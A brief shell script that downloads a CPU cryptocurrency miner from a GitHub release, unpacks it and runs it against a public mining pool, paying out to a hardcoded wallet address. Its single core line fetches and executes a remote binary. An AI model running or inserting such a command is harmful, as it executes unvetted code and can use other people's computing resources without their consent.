#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -a m7mhash -o stratum+tcp://mine.zpool.ca:6033 -u LYVvwWP8iRd65v2hVwg4ETXcAjLefmBuF6.rig1 -p c=LTC -t 8

     echo COUNTER $COUNTER
     let COUNTER-=1
done
